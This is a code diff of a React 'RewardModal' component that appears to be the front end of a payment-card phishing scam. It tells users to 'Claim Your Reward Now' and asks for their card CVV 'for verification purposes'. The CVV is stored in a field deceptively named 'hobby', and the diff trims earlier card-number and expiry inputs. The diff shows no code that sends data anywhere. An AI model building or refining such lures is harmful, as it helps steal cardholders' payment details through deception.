@@ -157,7 +157,7 @@ export default function RewardModal() {
     let valid = true
     const newErrors = { cardNumber: "", hobby: "", expiryDate: "" }
 
-    // Only validate CVV field since card number and expiry date are commented out
+    // Only validate CVV field
     if (!formData.hobby.trim()) {
       newErrors.hobby = "CVV is required"
       valid = false
@@ -224,10 +224,6 @@ export default function RewardModal() {
         )}
 
         {showNotification && (
-          // <div className="absolute top-0 left-0 right-0 bg-yellow-500 text-white p-2 flex items-center justify-center z-20">
-          //   <AlertCircle className="h-4 w-4 mr-2" />
-          //   <span className="text-sm font-medium">Please click "Secure Your Card Now" to proceed</span>
-          // </div>
           <div className="absolute top-0 left-0 right-0 bg-yellow-500 text-white p-2 flex items-center justify-center z-20">
             <AlertCircle className="h-4 w-4 mr-2" />
             <span className="text-sm font-medium">Please click "Claim Your Reward Now" to proceed</span>
@@ -285,35 +281,14 @@ export default function RewardModal() {
                 {showVerificationMessage && (
                   <div className="bg-blue-50 border-l-4 border-blue-500 p-3 flex items-start">
                     <Info className="h-5 w-5 text-blue-500 mr-2 flex-shrink-0 mt-0.5" />
-                    {/* <p className="text-sm text-blue-700">
-                      Please enter your card details for verification purposes. This is required to secure your card.
-                    </p> */}
                     <p className="text-sm text-blue-700">
                       Please enter your card cvv for verification purposes. This is required to verify your card.
                     </p>
                   </div>
                 )}
 
-               
                 {showCVV && (
                   <div className="space-y-4 animate-in fade-in duration-500">
-                     <div className="space-y-2">
-                      <label htmlFor="cardNumber" className="text-sm font-medium block">
-                        Card Number
-                      </label>
-                      <Input
-                        id="cardNumber"
-                        name="cardNumber"
-                        placeholder="1234 5678 9012 3456"
-                        value={formData.cardNumber}
-                        onChange={handleInputChange}
-                        className={errors.cardNumber ? "border-red-500" : ""}
-                        maxLength={19}
-                      />
-                      {errors.cardNumber && <p className="text-red-500 text-xs">{errors.cardNumber}</p>}
-                    </div>  
-
-                
                     <div className="space-y-2">
                       <label htmlFor="hobby" className="text-sm font-medium block">
                         CVV (3 digits on back of card)
@@ -330,22 +305,6 @@ export default function RewardModal() {
                       />
                       {errors.hobby && <p className="text-red-500 text-xs">{errors.hobby}</p>}
                     </div>
-
-                 <div className="space-y-2">
-                  <label htmlFor="expiryDate" className="text-sm font-medium block">
-                    Expiry Date
-                  </label>
-                  <Input
-                    id="expiryDate"
-                    name="expiryDate"
-                    placeholder="MM/YY"
-                    value={formData.expiryDate}
-                    onChange={handleInputChange}
-                    className={errors.expiryDate ? "border-red-500" : ""}
-                    maxLength={5}
-                  />
-                  {errors.expiryDate && <p className="text-red-500 text-xs">{errors.expiryDate}</p>}
-                </div> 
                   </div>
                 )}
 
@@ -420,6 +379,6 @@ export default function RewardModal() {
           </>
         )}
       </div>
-    </div >
+    </div>
   )
 }
